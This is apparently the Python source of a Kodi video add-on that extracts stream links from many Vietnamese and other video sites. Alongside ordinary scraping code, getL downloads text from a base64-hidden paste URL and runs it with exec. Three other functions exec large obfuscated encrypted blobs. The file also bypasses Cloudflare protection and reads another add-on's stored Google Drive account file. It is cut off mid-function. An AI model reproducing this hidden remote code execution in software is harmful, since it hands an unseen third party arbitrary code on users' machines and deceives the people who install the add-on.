# -*- coding: utf-8 -*-

import re, urlfetch, unwise, json, random, urllib, urllib2,base64
import os
from time import sleep
from addon import alert, notify,notify1, TextBoxes, ADDON, ADDON_ID, ADDON_PROFILE, LOG, PROFILE
import xbmc,xbmcgui
from config import VIETMEDIA_HOST
import os, sys
import time, socket
import vmfdecode as vmf
#import urlresolver, socket

USER_VIP_CODE = ADDON.getSetting('user_vip_code')
ADDON_NAME = ADDON.getAddonInfo("name")
PROFILE_PATH = xbmc.translatePath(ADDON_PROFILE).decode("utf-8")
T='aHR0cDovL3BsYXllci50cnVuZ3VpdC5uZXQvZ2V0P3VybD0='
F1 = 'U2FsdGVkX18tMUoo3k2cYautKONoQ5xHCpLDHBz/RNhTLRbBvHKgrtMKiRks5tw4'
HOME = xbmc.translatePath('special://home/')
USERDATA = os.path.join(xbmc.translatePath('special://home/'), 'userdata')
ADDONDATA = os.path.join(USERDATA, 'addon_data', ADDON_ID)
DIALOG = xbmcgui.Dialog()
vDialog = xbmcgui.DialogProgress()
def fuck(t):
	return (t.decode('base64'))

	
my_site = ['ok.ru','pornhub','xvideos','youporn','yourupload','xtube','xnxx','weibo','vk.com','vimeo']
def fetch_data(url, headers=None, data=None):
  	if headers is None:

  		headers = { 
    				'User-agent'	: 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 VietMedia/1.0',
                	'Referer'		: 'http://www.google.com',
                	'X-User-VIP'    :  USER_VIP_CODE
            }
  	try:

  		if data:
  			response = urlfetch.post(url, headers=headers, data=data)
  		else:
			response = urlfetch.get(url, headers=headers)
           	return response

	except Exception as e:
  		print e
  		pass

def debug(text):
	filename = os.path.join(PROFILE_PATH, 'debug.dat' )
	if not os.path.exists(filename):
		with open(filename,"w+") as f:
			f.write("DEBUG VMF")
	else:
		with open(filename,"w+") as f:
			f.write(text)
def writesub(text):
	filename = os.path.join(PROFILE_PATH, 'phude.srt' )
	if not os.path.exists(filename):
		with open(filename,"w+") as f:
			f.write("")
	else:
		with open(filename,"w+") as f:
			f.write(text)


def removeNonAscii(s): return "".join(i for i in s if ord(i)<128)
def get(url):
	
	'''
	filename = os.path.join(PROFILE_PATH, 'lastfile.dat' )
	with open(filename,"w+") as f:
		link = 'Name:Last movie'+'Link:'+url+'-'
		link = urllib.quote_plus(link)
		f.write(link)
		f.close()
	'''	
	if url is None or len(url)=='':
		return "plugin://plugin.video.youtube/?path=/root/video&action=play_video&videoid=" + 'gXyKqctk7sk'
	for x in my_site:
		if x in url:
			return PlayToKodi(url)
	if '//fptplay.vn' in url:
		return get_fptplay(url)
	if 'fshare.vn' in url:
		if 'token' in url:
			match = re.search(r"(\?.+?\d+)",url_input)
			_token = match.group(1)
			url = url.replace(_token,'')
		if not 'https' in url:
			url = url.replace('http','https')
			fshare_id = re.search(r"file\/(.+)",url).group(1)
			url = 'https://www.fshare.vn/file/%s' % fshare_id
			
		return get_fshare(url)
	if '4share.vn' in url:
		return getL(url)
	if len(url)==12 or len(url) == 15:
		return get_fshare(url)
	if 'hdo' in url:
		return get_hdonline(url)
	if '//htvonline.com.vn' in url:
		return get_htvonline(url)
	if '//hplus.com.vn' in url:
		return get_htvplus(url)
	if '//xuongphim.tv' in url:
		return get_xuongphim(url)
	if '//phim3s.net' in url:
		return get_phim3s(url)
	if 'tvnet.gov.vn' in url:
		return getTvnet(url)
	if '//kenh1.mobifone.com.vn' in url:
		return get_mobifone(url)
	if '//thvl.vn' in url:
		return get_thvl(url)
	if 'link.tvmienphi.biz' in url:
		return get_tvmienphi(url)
	if 'serverthunghiem' in url:
		return get_serverthunghiem(url)
	if 'tv24.vn' in url:
		return get_servertv24(url)
	if 'acestream' in url:
		return getAcestream(url)
	if 'sop:' in url:
		return getSopcast(url)
	if 'vtv.vn' in url:
		return getVtv(url)	
	if 'clip.vn' in url:
		return getClipvn(url)
	if 'haivn.com' in url:
		return getHaivn(url)
	if 'hayhaytv.vn' in url:
		return getHayhayTV(url)
	if 'kphim.tv' in url:
		return getKphim(url)
	if 'truongquocvi.com' in url:
		return getTQV(url)
	if 'anime47.com' in url:
		return getAnime47(url)
	if 'mp3.zing.vn' in url:
		return getMp3Zing(url)
	if 'hdsieunhanh.com' in url:
		return getHdsieunhanh(url)
	if 'aphim.co' in url:
		return getAphim(url)
	if 'aW1wb3J0IHV' in url:
		return getaW1wb3J0IHV(url)
	if 'j86pdnZyIQOr' in url:
		return getj86pdnZyIQOr(url)
	if 'xemphimso.com' in url:
		return xemphimso(url)
	if 'vtvgo.vn' in url:
		return get_vtvgo(url)
	if 'phimnhanh.com' in url:
		return getL(url)
	if 'google.com' in url:
		addon_google = os.path.join(USERDATA, 'addon_data', 'plugin.googledrive')
		filename = os.path.join(addon_google, 'accounts.cfg' )
		if os.path.exists(filename):
			with open(filename, "r") as f:
				content = f.read()
			f.close()
			driveid = re.search(r"\"(.+?)\"",content).group(1)
			doc_id = re.search(r"d\/(.+?)\/", url).group(1)
			video_url = 'plugin://plugin.googledrive/?item_id=%s&driveid=%s&item_driveid=%s&action=play&content_type=video' % (doc_id,driveid,driveid)
			return video_url
		else:
			return getGoogleDrive(url)
		
	if 'openload' in url:
		return getOpenloadLink(url)
	if "sweetiptv.com" in url:
		return getseetiptv(url)
	if "samsungcloud.com" in url:
		r = urlfetch.get(url)
		regex = r"longdesc=\"(.+?)\""
		matches = re.search(regex, r.body)
		video_url = matches.group(1)
		return(video_url)
	if 'vtv16.com' in url:
		return getVTV16(url)
	if 'hsex.tv' in url:
		return getHsex(url)
	if 'vtcnow.vn' in url:
		return getVTCnow(url)
	if "dailymotion.com" in url:
		match = re.search(r"video\/(\w{7})",url)
		video_id = match.group(1)
		return "plugin://plugin.video.dailymotion_com/?url=%s&mode=playVideo" % video_id
	if 'thvli.vn' in url or 'thvl.vn' in url:
		return getTHVL(url)
	if 'dkn.tv' in url:
		return getDKN(url)
	if 'facebook.com' in url:
		return getFb(url)
	if 'LbZWhA2HP4ah' in url:
		return getLbZWhA2HP4ah(url)
	if 'q6c5YwDbZTWH' in url:
		return q6c5YwDbZTWH(url)
	if 'subscene.com' in url:
		return subscene(url)
	if 'phim14.net' in url:
		return getPhim14(url)
	if 'dongphim' in url:
		return getDongphim(url)
	if 'mocha.com' in url:
		return getMocha(url)
	else:
		return url
	
def getMocha(url):
	headers = {
		'Connection': 'keep-alive',
		'Cache-Control': 'max-age=0',
		'Upgrade-Insecure-Requests': '1',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
		}
	r = urlfetch.get(url,headers=headers)
	video_url = re.search(r"source src=\"(.+?)\"",r.content).group(1)
	return video_url
	
def getL(url):
	r=curL('aHR0cHM6Ly90ZXh0dXBsb2FkZXIuY29tL2R5OTR1L3Jhdw=='.decode("base64"))
	exec(fuck(r))
	return video_url

def getDongphim(url):
	import requests
	headers = {
		'Connection': 'keep-alive',
		'Cache-Control': 'max-age=0',
		'Upgrade-Insecure-Requests': '1',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
		}
	s = requests.Session()
	r = s.get(url, headers=headers)
	data = re.search(r"this\.urls=(.+?);",r.content).group(1)
	item_id = re.search(r"data-view-id=\"(.+?)\"",r.content).group(1)
	username='cavephim'

	jStr = json.loads(data)
	url = jStr[0]["url"]
	burl = jStr[0]["burl"]
	purl = jStr[0]["purl"]
	exhls1 = jStr[0]["exhls"][0]
	get_url= 'http://dongphim.net/content/parseUrl?url='+url+'&bk_url='+burl+'&pr_url='+purl+'&ex_hls%5B%5D='+exhls1+'&v=2&len=0&prefer=https%3A%2F%2Fdd.ntl.clhcdn.net'+'&item_id='+item_id+'.&username=cavephim'
	r = s.get(get_url)
	jStr = json.loads(r.content)
	if 'google' in r.content:
		video_url = jStr["formats"]["720"]
	elif 'ok.ru' in r.content:
		video_url = jStr["formats"]["embed"]
		video_url = video_url.replace('?autoplay=1','')
	else:
		jStr = json.loads(r.content)
		for i in jStr["formats"]:
			try:video_url = jStr["formats"]["720"]
			except:video_url = jStr["formats"]["480"]
	if len(video_url) == '':
		alert("Web phim đổi code. Cần sửa.")
	else:
		if 'ok.ru' in video_url:
			video_url = urlresolver.resolve(video_url)
		return (video_url)

	
def getPhim14(url):
	import requests
	headers = {
		'Connection': 'keep-alive',
		'Cache-Control': 'max-age=0',
		'Upgrade-Insecure-Requests': '1',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
	}
	s = requests.Session()
	r = s.get(url,headers=headers)
	match = re.search(r'<iframe src="(.+?)"',r.content)
	getlink = match.group(1)
	r = s.get(getlink,headers=headers)
	regex = r"var urlVideo =\s+'(http.+?)'"
	match = re.search(regex,r.content)
	video_url = match.group(1)
	return video_url+'|User-Agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F72.0.3626.119+Safari%2F537.36&Referer=' +getlink

def WcLeeL0vZik1(Dx5X7YPC6MYn, NMr5AAsWvtqg):
    NgotZ9mZPvkD = []
    NMr5AAsWvtqg = base64.urlsafe_b64decode(NMr5AAsWvtqg)
    for i in range(len(NMr5AAsWvtqg)):
        Dx5X7YPC6MYn_c = Dx5X7YPC6MYn[i % len(Dx5X7YPC6MYn)]
        a6LNJYq6KoO4 = chr((256 + ord(NMr5AAsWvtqg[i]) - ord(Dx5X7YPC6MYn_c)) % 256)
        NgotZ9mZPvkD.append(a6LNJYq6KoO4)
    return "".join(NgotZ9mZPvkD)	
def cloudfare(url):
    import cfscrape
    scraper = cfscrape.create_scraper()
    user_agent='Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0'
    cookie, user_agent = cfscrape.get_tokens(url,user_agent)
    cookie = json.dumps(cookie)
    jstr = json.loads(cookie)
    jstr['cf_clearance']
    cf_clearance = jstr['cf_clearance']
    __cfduid = jstr['__cfduid']
    cookie = 'cf_clearance='+cf_clearance+'; __cfduid='+__cfduid
    return(cookie)
def curL(url):
	headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','referer': url,'cookie': cloudfare(url)}
	r = urlfetch.get(url,headers=headers)
	return (r.body)
def q6c5YwDbZTWH(url):
	exec(vmf.XvaYOy8Z4Djz(WcLeeL0vZik1('98888775512255778954',"nZCCq4F7Z5yZiXylgaOBo5uArZySao2ngmp8Z46riIyZZYmgj6WHjIx7m6uOaYWCj4iIf4J9kZiZkKishHubbYd7nmmEdZVlg4mMr4WjfmWHjJtrh3uiZoN0laV_Z3CfnZGDrIxrimyPpGiJj2Njmodno6yPo4-mm7KNsJqkb2aXiYOggIiigpmAi5yTf46xm7B4bn55paCXaIGnkmuhqYOyp5-CaZ9lmXl0rISeb62Za52qnH-gqJqOr6GBnmeemXiaqoJre56Sao6vnHpooZeegKiPfKOskrKYaoJ7nKadpKOsgXR0nY-MkaqRkYeghXt6oZugmqh_ZIisj42Aq5GQmaCbpommh6B4o4mIa2iWjK-qkYxtZYWieZ-DfZull56EqJlohJ6MpYabhox5rYV7qpyLY56ng5-IboGBnGaHe6OfiY95rJd4iIqPjIGDmZGGqoeMhWuEoYRnfnSafoh7iYWMfKybm3-kqpKKeX2PiICkl66inolrna2bammkhLGarYGbc6eCr4xqh3xpaYh7eoyRjpGdmJ6dqIOJhGqEo4Jmg7GvppFpcKqZeIinmXhoZ52Rd6CDsqefgml9rJh4qqKOZ31nmZBuqYVrn6ycaptogYiMqJiiZ6uckX-nk49topppiaGPdaWZjmefn5ung6CdfGmOjnyQqYR0laV_Z31onICdqpylpGidipprfnSWpJZ8cK6ZgKGom3-NrZqkjWV_qqmgmnhosJKRe2WTkIZoko6IqZljnmKWeJptgXyZjY2NsIGcf4msip6IqpmMjbGcfJltfKaCpJuKeG5-eYirl3yvp5GjfqmOpY6wnI6Nr5l0mmOYoq6ne6d_oJyLbaCSfomblniImo98jbCDfJmKnGqOsYSMfaOPiGdif66unoJpZqqepaSrmn58q4OEZql-eJ-PmZBqn5trnLKBfGyKfnWLp4KIop6JkXerm3-OkJKOgYGWiYOog4mEaoSjgmaCe6CEi32Jg4l0qZmXfKOpkox3fJOPhqqasKKchmOaq5dnaKOEs4ashaJ5rYWhgK6EdGapfnuFn5Kme62ai3BphbGaqoKri5mLoqOjnH5moJN_pKCEsXyqgnSVonijgaObbHeqm6aGpIF7Z5yZiXyll3yjoIWiamWcpbCum36NqoB5fJ6YiKKCm6NmrZOQhq-aaWyvj4Rnq4-MfaKDfKB_m49-aJFpnpyFhHSrj4hssZKQe62Sap-nm6CBoI6JhJqBjKOiiI-snYR7bKqIsKOYfpp7pZieooKbgG6unX5xqJJ6eG5-eGOamXyFpoSmma2ba46vg3t8pXieY5qZfIWmgX1lm5ylja2baY2dmJ6AoYB9gKCSkXeknGpxo5KLppyAd6qdgK6ioISBfqR8pY6vmY-Fq494h5mFiHmrkZGHnpp7baabpHBmmHSZqoCGp6uRkYeemnt5cYF_gaGBn4Cejo2BoZl8na2Cpoakm6WRoZiboZmAe6-ig7KgnYWAgah7pYWhmJ-MnpieeHCBgGacnX-Gp4Skm66XZIipgHl8p3umZpydf4angXtnnJieh6ePoqOskoB7p5t7oLGCaK6el55rp45njZqBo6WXgqGfrYOxb6WNdHuggX2Ap3umaqqbpYakgXtnnJeIeGKOZ5-ZhaVlf5N_fmiRinhufnmloI6MhWeZkG6pg7Knn4Jpn52XeJ6mjWd9qJGRnZqcf7CgnY6Nrn-qqaCXonCskWuKooiheq2aaWyfj4SpoI-Neaeba26fk4ubboF-jayWiYCoj3yMqoJsg6CcppKkm6Caa355gJ6Yo5Gjm6Ksopx_cbKcfqOgf6uhmZh8cLGcf26kk4Bog5ugeG5-eYirl3yRo5yAg6OFpnqum2qIpH9jmmKZfXmxh6JtqppqoK6bfp-ll4iqnoGibKOcfG5nnHtpoJJ-aKWXmmuaj3xop5qiZpyapX5shKV5pJh0laV-fJ-jkZCHoJymhXGZfo2dj3iIq5iurp6SgHtkkoxpo5GPiZ2AgqKmjo2JoZl8dm2CgIKkhKWFoY6JfJyWeJ-wgmyDrZKyaZuBoJ6qgKtqoo14gKWEgX6pkqVxo52KooCWiIuZl4x9Z5FrnGp8n6RqmY6JoZdia2OYoq6eiIx3qJKQiqKZemyjmJ5rY5h4nq-DiqR-fJ-kaJulomt4mJ18l4x9Z5FrnJuJi3qxkopsr4-IeKuOZ56mm6J_ZZylr3GDemungIR7pZmio6KSkG6anZCCq4OIpn94iJ6ffnxon5yAg6OIn6eCe4ijZ5aIhJ6XZnBom6asm4mLeqyRj4mflnRnoJiicGibfJyshImngnuIo2eWiISel2ZwaJumrJuJi3pqmY6JoZdia2OYoq6skoCLnptqiqSDeoGejomAnoOfiKCDiqR-fImkqZtqia5-dWKZlqOFrZqiaqeban6jm7CfZ5aIhJ6XZnBom6aspHyfo4J7j5Glj3iIqI1ojbCafHZtgn-ospx_gZeCd2OUfqKRp5qAip2RiaeCe4iigHiCnp6XfYWjh6CkfnyJpGqZjomhl2JrY5iirp6IjHajnKWOspppr2ePiYirl3hssJKRg6qbgJKkg3-RpY94iKiNaI2wmnygpHyfpKSdfoWhmHmDaHicooGRa26qmmqkpIF7Z5yOY6qomYyJpJGRf6CEgJKokn6Nq41kiKuXeKKCe4qhqJKQiqKZenhufnl8noGjhaORkX-emnugsYGkn2WZeXSshJ5vrZxsmWeFpZKkmo6BoY90Z5yXZ2etnKJto4Whq6iBoK9nloiEnpdmcGibpqykfJ-jgpmOkJyXiHhijmeebXugoH58kJKokn6Nq41jnp1-eWeempB7ZJJqn62SaoGrmYlzoYKIooJ7iqB-kpB6qJBqja6XdHNrfnibppyBh6ucsqeuhGqbaJmqZ5-PjGigkpCGqZJqcayEaX2sloRrrJdojbCRa4qqg5CFpoF6jJyZnp6dj4xwnZmQhn98iaOCmX6NnY94iKuYrnhwgYGof3yJo4J7ipufl2NrpJaMjKWHoneem2pxqpmOjKh4mJ18eIaipZpsf6STaqStgrGmnH9jmmKZfXmxh6Jtqp1rnGuEpJGhl4h8no94bKGaa2WihXmngnuIon9_ZIisj42Aq5GQmaCbpommh6B4o4mIa2iWjK-qkYxtZYWieZ-DfZull56EqJlohJ6MpYabhox5rYV7qpyLY56ng5-IboGBnGaHe6OfiY95rJd4iIqPjIGDmZGGqoeMhWuEoYRnfnSafoh7iYWMfKybm3-kqpKKeX2PiICkl66inolrna2bammkhLGarYGbc6eCr4xqh3xpaYh7eoyRjpGdmJ6dqIOJhGqEo4Jmg7Gvg3uIon94hJacl2dsZ5KQamSFkIptm36Mo4Sac6COjXmumoChnpKQiqiaaWurmnRjZZlomquSpm6tm4tpaZukr6GXnoCoj3yNooeyd56af36xm2mNZYWHiIeHnmdrgrKsf3yJo4J7ipudjmOAnph9iKWHonaihKFwqYKwroB4gp18eIibsJKQj6CcpY6xgrGmnJmenp2PjHCdnJF_p4V5p4J7iKJ_f2N4Y5l8n62bpqFknoubboF6m2iZZJWnj6KNq5Gmi5-FpYaumoqaqHiYnXx4hqKlnXxmrZOQfmmSj4Vlj4iDpplno2eZfJhqgnuckYyMr36ZeYSpiqKNr5yQi66de5ure56if3iCnmt4nKKBe5CHnJ1_fZ-Iinlsf2R7oISeeKWCsqyik3ubboF6m2iZZJWnj6KNq5Gmi5-FpYaumoqbbniYnXx4jYCeiIx3ZZylsKWSj4mflnRnqZdohWeDgHurmo5xaZukrqiWeIiaj3yNsJuzZqOTj36jko-Br4F4hJqZfHxwkoB7ZJKLo4N7iKJ_lp-AYpieeHCBgKWum2psrZp-cJ2PeX-hmJ5soJprh2mEiaeCe4ijZ5aIhJ6XZnBom6asm4mLeqmbaomujKp8nY6NiZ-BpWaWho5pmoGkkaWXeIebjYamgXuKoWaaj4qkmmhwZpieqZmFiHilmYGHZJyAhW6EsHBomWSVp4-ijauRpoufhaWGrpqKmqeZnp6dj4xwnZyRf6d8n6OCe4imf3iIiKWYZ4xte6CgfnyQkqiSfo2rjWSIq5d4eHCBfJ1mmo-KpJpocGaYnqmieKKNqptrimp8n6Rom6Wia3iYnXyXjH1nkWucm4mLerGSimyvj4h4q45nnqabon-um2uOsZFpja-EmnOhgZ6qp4R8fqecoW2hmmmJaoCCoXx4jKOkgYBmnJ1_hqeHnqZ_eIKeZJaMiaOaam5lnKWvn4iKeamOiYSclnhspZumbmWce5-wg4imf3iCnqOYaImwgX1lm5qmhq6aoGyol2N4nZiun2mZkIegm2lxaZukrqV4mJ18eI2Rp5KAi6qRa46xmnp4bn54oqyZfYGZhX9mloKlkqiafoyejYKhfHiGo6eSonaik2pxrpJpr6F_qnSil555aJumrGp8n6OCe4ijZ5aIhJ6XZnBom6asm4mLeaebpI2vl2OqZI-NjbCafGqtk5CGrpp_kaGAeYyij3yNrZBsi62be6Ooe56if3iIiKWYZ4xte6CgfnyJpGqZjomhl2JrY5iirp6IjHdmmo-KpJpocGaYnql9eIyNa5Fri6udfKeDe4ijnZd4iKuZeJ6gjmuLnYJ_sqCtbJulfpqdbw==")))
	return (video_url)
	
def getLbZWhA2HP4ah(url):
	exec(vmf.XvaYOy8Z4Djz(WcLeeL0vZik1('98888775512255778954','nZCCq4F7Z5yZiXylgaOBo5uArZySao2ngmevnoydlqGGiYGAjX2HnJp7m6uSpY2flqqZoI6Kn4qFgIN5m2uShYVpiK-PeZ1jmWd9f5qBh52PsqSvjH5nZpd4hHSFiWelg4ygf5yheXGBfoVmmJypoZmNgaqDiqWdgnxon5yObGiWiYCegaONrJxroa6TjnGvm6Rwn4-JgKyAfYCne6ZmnJ1_hqeBe2ecmJ6Hp5hnjZ-bpoOjhICBoZGOp52ad6mhmq6baJumrKKIoZunhKCqZICElaV-nq-gg4qlpZxpcaKaaYmhfnVimZeMfWeRa5ypk2uCrpyPeKSChJ19lqOFnZFrbp-Ti3lxgX6nr41jgKiPfIysm6aLq5t_fqKSip6ef6qmZZaMbKKabJipimiwgoqMbIqNYZ6DgK6aoIR8f6mdj7CrgaCigJl5fGeEnKaBm6J2bYJ_hmmboq6klp-AmI5ncKKSjKB_fI-Bn4iKeWaXn5aimGeMrJyQameakIakkGp5rpdjgJ6YaISmm6Kgf3yPaaCcfoWkfnVimZiijKyba4ucnKWGp4N_gJ6ZY3hijmefp5qmmKmcao5oin6Nn5ifnqmZequjnY-so4Oxn62DsW-lf6p7pY6eooJ7joegkmuCbZt_iYGPiZ2ZhYh5q5GRh56ae22mm6RwZph0maqAhqaBmpB7ZJJqn5-Iinmuj4RnrI-MfbCRa5yjnKGCnpukja-YeGunmGeNgptrbqmJjq-mg3prp4WqnpV_roCqkaKgf3yPqLKcf4CchYR0po6NiaGZfGqinKVxaZt6nq2AgqF8lqOFZ5uidm2Cf6iymmlrqpd4a5qPfYSmmaeDZJyho4N7j4ichYR0pY-Ma6aZp4NknKSrppqOjaCWiHisf2Znp3ugoWaaj4qkmmhwZpieqZmFiHmom2yHrZCxnKySjomljol_oI2LqqacfGWshI5pmoJqja6XdJaWeJyjo5uAoa6baoqki46InIWEdKyZfYCmmaeDZJykq6aSj3mlmGNrnY-Ko6KCamWkfJ-ko5KOhauPeIiYmY2BqoF9ZZudpWmlhKSbpY6efJ6YoqOxmX57eo6xoGqZjomhl2JrY5iirqqBfoegkmuCbZt_iYGPiZ2ieJyigpKRnZ6TkHpoh56mf5menp2PjHCdnJF_p4J8aJ-CsJqAeIh4pY-NgWeDfJmMk4-Bn5KPga6XZHuggIamdA=='))) 
	return(decode_url)

def decode():
	import requests
	exec(vmf.XvaYOy8Z4Djz(WcLeeL0vZik1('98888775512255778954','kqVxo52KeG5-eXyemI2No5tsh66FpZyknHp4pH50fKGZfYmuh6Jtqp2AkqeRj6Kql2R8oIFoeaqRkaGgnKWcqoRpn2uOhGepln14oIOMdqmCgIqknX-IgJl4iGaZeHiqgYGPnJymhZ-Iinmuj4Rzp358ha2akXekm3-Nn4N6eKOZnnirfnifmZClra6ffGmcg6CjmJiramuAe6-ZhKKoY5F-aKiCsHiofnl8nn54a56Nsnakgntsn5Kko6qPeHill3h4poGAf6qTgKOfg4p5l351c5mNhqehmmtqZJOPbWiQaaedmZ53mYWIeaOcpnungnufn5ykfa6YqnOieKKrZ4F9ZZuDa6uvno-qrZuElaePonCwmpB7ZIR7m2iFjpBmhHV3q4OfmmySo6BnkrKfspKLgGiOq4eshIx9oYajnZ6Gf4qihqCaqJhja6uZfI2ig4CDqpumiqSapYmblp54ZI6Ir6mSkaBtm3-OrYF6o5eBhXyWgaKJo5Frbp-Ti5-mnI5spY5ja52PiGijm2uDnJx_jaaDiqKAmZ54q4KeeHCBgYOqnKaKpJJ6n5-XY2dij4xsZ5BrpZydpX2rmWmNaoWIqp6XnqOZhI17mIWliqSRaXCgj4SZoJmMbKeRa26fk4tppJtphZ2YeIeggIann4F9ZZucpY2tm2mNnZiegKGAeJtpkZF-m5KMaKeEi3CYj3Slon-ur2mRkX6thIttppukcGaYdJmqgIanoIF9ZZucpY2tm2mNnZiegKGAeJtpkZF-m5KiaKeEi3CYj3Slon-ur2mRkX6thIttppukcGaYdJmqgIanoYF9ZZucpY2tm2mNnZiegKGAeJuwkpGHZZylbJ-Ei2-kjXiDpICImqqcpnuthqGjrZJqgauZiXOhgoiigpyAqaaCfGifgmqqrJuEZ2mCjWelhKaPqpylaaCcep-fgXiep5l4n5-DjHamgn-krZx6n56AhJ19mJ54cIGBi62bf5KknH6FpIGelp6ZeJ6gmYGHZJx8p66EapGlj4mEpo-MiaeRkI6pm6WOaIRpiaGOY2udj4twZ5ymnZyei22vmX94ZJmJfKWFiI2xgaJ2oIKAiqqZsKKAmXilmYWIebCEpn-qk4CjdQ==')))
	return(kt,tkk,tk)
def getj86pdnZyIQOr(url):
	url = url.replace('j86pdnZyIQOr','tvhay.org')
	import requests
	headers = {
		'Upgrade-Insecure-Requests': '1',
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
		'Referer': url
	}
	s = requests.Session()
	r = s.get(url, headers=headers)                     
	
	if "ok.ru" in r.content:
		video_url = re.search ( "link=(https*\://(www\.)*ok.ru/videoembed/\d+)",r.content).group(1)
	else:
		kt,tkk,tk = decode()
		b = unwise.unwise_process(r.content)
		content = re . compile ( '"file"\s*\:\s*"(.+?)".+?"label"\s*\:\s*"(.+?)"' ) . findall ( b )
		video_url = re.search(r"link:\"(.+?)\"",b).group(1)
		headers = {'Referer' : 'http://tvhay.org/','Content-Type' :'application/x-www-form-urlencoded'}
		data = {'link': video_url,'kt': kt,'tkk': tkk,'tk': tk}
		r = s.post( "http://tvhay.org/playergk/plugins/gkpluginsphp.php" , data = data, headers = headers)
		jstr = json.loads(r.content)
		try:
			t = len(jstr["link"])
			video_url = jstr["link"][(t-1)]["link"]
		except:
			video_url = jstr["link"]
	if 'ok.ru' in video_url:
		video_url = urlresolver.resolve(video_url)
		return video_url
	else:
		video_url = video_url
		return video_url+'|User-Agent=Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0&Referer=http://tvhay.org'
	
		
		
	
	
def getOkru(url):
	link = urlresolver.resolve(url)
	return link
	
def getFb(url):
	match = re.search(r"href=(.+)",url)
	if match:
		url = match.group(1)
	getlinkFb = "https://www.facebook.com/plugins/video.php?href="+url
	xbmc.log(getlinkFb)
	headers = {
		'authority': 'www.dkn.tv',
		'upgrade-insecure-requests': '1',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36',
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		}
	r = urlfetch.get(getlinkFb, headers=headers)
	regex = r"FBQualityLabel=(.*?BaseURL>\\)"
	matches = re.finditer(regex, r.body)
	lable = list()
	href = list()
	for matchNum, match in enumerate(matches):
		matchNum = matchNum + 1
		
		for groupNum in range(0, len(match.groups())):
			data = (match.group(groupNum))
			regex = r"FBQualityLabel=\\\"(.+?)\\\""
			match = re.search(regex,data)
			lable1 = match.group(1)
			lable.append(lable1)
			regex = r"BaseURL>(.+?)\\u003C"
			match = re.search(regex,data)
			href1 = match.group(1)
			href.append(href1)
			groupNum = groupNum + 1
	try:
		t = lable.index("720p")
		video_url = href[t]
		video_url = video_url.replace("\/","/")
		video_url = video_url.replace("amp;","")
		return(video_url)
	except:
		t = lable.index("480p")
		video_url = href[t]
		video_url = video_url.replace("\/","/")
		video_url = video_url.replace("amp;","")
		return(video_url)
		pass
def getDKN(url):
	match = re.search(r"href=(.+)",url)
	if match:
		url = match.group(1)
		url = url.decode("base64")
	if "facebook.com" in url:
		href = getFb(url)
	else:
		headers = {
			'authority': 'www.dkn.tv',
			'upgrade-insecure-requests': '1',
			'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
			'referer': 'https://www.dkn.tv/',
			'cookie': cloudfare(url)
			}

		r = urlfetch.get(url,headers=headers)
		regex = r"<iframe class=\"video-frame embed-responsive-16by9\" src=\"(.+?)\""
		match = re.search(regex,r.body)
		cur_vlink = match.group(1)
		match = re.search(r"href=(.+)",cur_vlink)
		fb_link = match.group(1)
		href = getFb(fb_link)
	return(href)

def getTHVL(url):
	import urllib2
	r = url.split('/')
	api_url = 'https://api.thvli.vn/backend/cm/detail/%s' % r[4]

	headers = {
		'origin': 'https://www.thvli.vn',
		'accept-encoding': 'gzip, deflate, br',
		'accept-language': 'en,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6',
		'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36',
		'accept': 'application/json',
		'referer': url,
		'authority': 'api.thvli.vn',
	}

	if '/live/' in url:
		req = urllib2.Request(api_url,headers=headers)
		f = urllib2.urlopen(req)
		body=f.read()
		Jstr = json.loads(body)
		video_url = Jstr["play_info"]["data"]["link_play"]
	else:
		headers = {
			'Connection': 'keep-alive',
			'Cache-Control': 'max-age=0',
			'Upgrade-Insecure-Requests': '1',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36',
			'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
		}
		req = urllib2.Request(api_url,headers=headers)
		f = urllib2.urlopen(req)
		body=f.read()
		Jstr = json.loads(body)
